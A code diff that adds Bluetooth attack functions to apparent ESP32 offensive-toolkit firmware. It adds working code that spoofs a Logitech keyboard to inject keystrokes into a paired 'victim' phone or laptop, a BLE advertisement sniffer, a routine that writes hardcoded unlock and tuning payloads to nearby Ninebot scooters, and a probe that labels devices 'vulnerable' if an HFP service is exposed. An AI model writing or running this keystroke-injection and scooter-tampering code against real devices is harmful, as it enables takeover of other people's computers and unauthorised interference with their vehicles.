@@ -7,6 +7,7 @@
 #include <WiFiUDP.h>
 #include <esp_wifi.h>
 #include <DNSServer.h>
+#include <NimBLEDevice.h>
 #include "wichat_hook.h"
 
 // Functions called from CLI (cli_bridge.cpp uses extern declarations)
@@ -330,4 +331,190 @@ void netcutStop() {
         if (nc_devices[i].cut) netcutRestore(i);
     }
     Serial.println("[OK] All devices restored");
+}
+
+// =============================================================================
+//  BADBLE — BLE HID keyboard injection to phones/laptops
+// =============================================================================
+#include <BleKeyboard.h>
+
+static BleKeyboard* s_bleKb = nullptr;
+static bool s_bleKbConnected = false;
+
+void badBleStart() {
+    if (s_bleKb) { Serial.println("[ERR] BadBLE already running"); return; }
+    // Spoof as Logitech keyboard
+    uint8_t mac[6] = {0x88, 0x3B, 0x5F, (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
+    esp_base_mac_addr_set(mac);
+    s_bleKb = new BleKeyboard("Logitech K380", "Logitech", 100);
+    s_bleKb->begin();
+    s_bleKbConnected = false;
+    Serial.println("[OK] BadBLE started — advertising as 'Logitech K380'");
+    Serial.println("[OK] Waiting for victim to pair...");
+}
+
+void badBleType(const char* text) {
+    if (!s_bleKb) { Serial.println("[ERR] BadBLE not started"); return; }
+    if (!s_bleKb->isConnected()) { Serial.println("[ERR] No device paired"); return; }
+    s_bleKb->print(text);
+    Serial.printf("[OK] Typed: %s\n", text);
+}
+
+void badBleKey(uint8_t key) {
+    if (!s_bleKb || !s_bleKb->isConnected()) { Serial.println("[ERR] Not connected"); return; }
+    s_bleKb->press(key);
+    delay(30);
+    s_bleKb->releaseAll();
+    Serial.printf("[OK] Key 0x%02X sent\n", key);
+}
+
+void badBleStatus() {
+    if (!s_bleKb) { Serial.println("[DATA] BadBLE: not running"); return; }
+    Serial.printf("[DATA] BadBLE: %s\n", s_bleKb->isConnected() ? "CONNECTED to victim" : "advertising, waiting for pair");
+}
+
+void badBleStop() {
+    if (s_bleKb) {
+        s_bleKb->end();
+        delete s_bleKb;
+        s_bleKb = nullptr;
+    }
+    Serial.println("[OK] BadBLE stopped");
+}
+
+// =============================================================================
+//  BLE SNIFFER — capture and parse BLE advertisements
+// =============================================================================
+void bleSnifferRun() {
+    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("Sniffer");
+    NimBLEScan* scan = NimBLEDevice::getScan();
+    scan->setActiveScan(true);
+    scan->setInterval(97);
+    scan->setWindow(67);
+    scan->setDuplicateFilter(false);
+
+    Serial.println("[OK] BLE sniffer — scanning 10 seconds...");
+    NimBLEScanResults results = scan->getResults(10000, true);
+
+    Serial.printf("[DATA] Captured %d advertisements:\n", results.getCount());
+    for (int i = 0; i < (int)results.getCount(); i++) {
+        const NimBLEAdvertisedDevice* dev = results.getDevice(i);
+        std::string addr = dev->getAddress().toString();
+        std::string name = dev->getName();
+        int rssi = dev->getRSSI();
+        std::string mfg = dev->getManufacturerData();
+
+        // Identify manufacturer
+        const char* vendor = "Unknown";
+        if (mfg.size() >= 2) {
+            uint16_t cid = ((uint8_t)mfg[1] << 8) | (uint8_t)mfg[0];
+            if (cid == 0x004C) vendor = "Apple";
+            else if (cid == 0x0075) vendor = "Samsung";
+            else if (cid == 0xFE2C || cid == 0x00E0) vendor = "Google";
+            else if (cid == 0x0006) vendor = "Microsoft";
+            else if (cid == 0x0059) vendor = "Nordic";
+        }
+
+        Serial.printf("[DATA] %2d  %s  %-20s  %4ddBm  %s  mfg:%d bytes\n",
+            i, addr.c_str(),
+            name.size() > 0 ? name.c_str() : "<no name>",
+            rssi, vendor, (int)mfg.size());
+
+        // Hex dump manufacturer data
+        if (mfg.size() > 0) {
+            Serial.printf("[DATA]     hex: ");
+            for (size_t j = 0; j < mfg.size() && j < 20; j++)
+                Serial.printf("%02X ", (uint8_t)mfg[j]);
+            if (mfg.size() > 20) Serial.printf("...");
+            Serial.println();
+        }
+    }
+    scan->stop();
+    scan->clearResults();
+    Serial.println("[OK] BLE sniffer complete");
+}
+
+// =============================================================================
+//  NINEBOT — scooter BLE unlock/tuning
+// =============================================================================
+static const NimBLEUUID UART_SVC("6E400001-B5A3-F393-E0A9-E50E24DCCA9E");
+static const NimBLEUUID UART_TX("6E400002-B5A3-F393-E0A9-E50E24DCCA9E");
+
+struct NinebotPayload {
+    const char* name;
+    const uint8_t* data;
+    size_t len;
+};
+
+static const uint8_t NB_MAX2G[] = {0x55,0xAB,0x4D,0x41,0x58,0x32,0x53,0x63,0x6F,0x6F,0x74,0x65,0x72,0x5F,0x31};
+static const uint8_t NB_F2[]   = {0x55,0xAB,0x46,0x32,0x53,0x63,0x6F,0x6F,0x74,0x65,0x72,0x5F,0x31};
+static const uint8_t NB_GEN1[] = {0x5A,0xA5,0x00,0x4B,0x48,0x94,0xE3,0x3A,0x91,0xE0,0x32,0x7E,0xC2};
+static const uint8_t NB_GEN2[] = {0x5A,0xA5,0x00,0x4B,0x48,0x94,0xE3,0x3A,0x91,0xE0,0x43,0x3E,0xC2};
+static const uint8_t NB_GEN3[] = {0x5A,0xA5,0x00,0x4B,0x48,0x94,0xE3,0x3A,0x91,0xE0,0x42,0x7E,0xC4};
+
+void ninebotAttack(const char* addrStr, int payloadIdx) {
+    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
+    NimBLEClient* client = NimBLEDevice::createClient();
+    client->setConnectTimeout(5);
+
+    NimBLEAddress addr(std::string(addrStr), 1);
+    Serial.printf("[OK] Connecting to %s...\n", addrStr);
+
+    if (!client->connect(addr)) {
+        Serial.println("[ERR] Connect failed");
+        NimBLEDevice::deleteClient(client);
+        return;
+    }
+
+    NimBLERemoteService* svc = client->getService(UART_SVC);
+    if (!svc) { Serial.println("[ERR] UART service not found"); client->disconnect(); NimBLEDevice::deleteClient(client); return; }
+
+    NimBLERemoteCharacteristic* ch = svc->getCharacteristic(UART_TX);
+    if (!ch || !ch->canWrite()) { Serial.println("[ERR] TX char not writable"); client->disconnect(); NimBLEDevice::deleteClient(client); return; }
+
+    const uint8_t* payload; size_t plen;
+    switch (payloadIdx) {
+        case 0: payload = NB_MAX2G; plen = sizeof NB_MAX2G; break;
+        case 1: payload = NB_F2;   plen = sizeof NB_F2; break;
+        case 2: payload = NB_GEN1; plen = sizeof NB_GEN1; break;
+        case 3: payload = NB_GEN2; plen = sizeof NB_GEN2; break;
+        default: payload = NB_GEN3; plen = sizeof NB_GEN3; break;
+    }
+
+    ch->writeValue(payload, plen, true);
+    Serial.printf("[OK] Payload %d sent (%d bytes)\n", payloadIdx, (int)plen);
+
+    client->disconnect();
+    NimBLEDevice::deleteClient(client);
+}
+
+// =============================================================================
+//  HFP PROBE — check devices for HFP vulnerability
+// =============================================================================
+void hfpProbe(const char* addrStr) {
+    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
+    NimBLEClient* client = NimBLEDevice::createClient();
+    client->setConnectTimeout(5);
+
+    NimBLEAddress addr(std::string(addrStr), 1);
+    Serial.printf("[OK] Probing %s for HFP...\n", addrStr);
+
+    if (!client->connect(addr)) {
+        Serial.println("[ERR] Connect failed");
+        NimBLEDevice::deleteClient(client);
+        return;
+    }
+
+    bool hasHFP = false;
+    NimBLERemoteService* svc = client->getService(NimBLEUUID((uint16_t)0x111E));
+    if (!svc) svc = client->getService(NimBLEUUID((uint16_t)0x111F));
+    if (svc) {
+        auto& chars = svc->getCharacteristics(true);
+        hasHFP = chars.size() > 0;
+    }
+
+    Serial.printf("[DATA] HFP: %s\n", hasHFP ? "VULNERABLE — HFP service exposed" : "Not found");
+
+    client->disconnect();
+    NimBLEDevice::deleteClient(client);
 }
